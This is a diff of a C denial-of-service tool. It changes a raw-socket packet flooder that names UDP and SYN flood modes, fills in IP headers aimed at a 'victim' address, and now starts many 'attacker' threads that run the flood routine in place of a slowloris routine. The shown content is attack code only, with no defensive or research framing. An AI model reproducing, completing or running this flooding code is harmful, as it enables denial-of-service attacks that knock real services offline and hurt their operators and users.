@@ -14,7 +14,7 @@
 #include <netinet/udp.h>
 #include <netinet/tcp.h>
 
-// TODO: Fix SIGPIPE
+
 typedef enum {
     UDP_FLOOD,
     SYN_FLOOD
@@ -147,9 +147,9 @@ void *flood(void *value)
 
         ip->ihl = 5;
         ip->version = 4;
-        ip->tos = 16;
+        // ip->tos = 16;
         ip->tot_len = length;
-        ip->id  = htons(54321);
+        //ip->id  = htons(54321);
         ip->ttl = 64;
         ip->saddr = ip_src;
         ip->daddr = packet->ip_victim;
@@ -241,8 +241,8 @@ int main(void)
     };
 
     for (int i = 0; i < THREADS; i++)
-        // pthread_create(&attackers[i], NULL, flood, &nodes);
-        pthread_create(&attackers[i], NULL, slow_lorris, &nodes);
+        pthread_create(&attackers[i], NULL, flood, &nodes);
+        //pthread_create(&attackers[i], NULL, slow_lorris, &nodes);
 
     for (int i = 0; i < THREADS; i++)
         pthread_join(attackers[i], NULL);
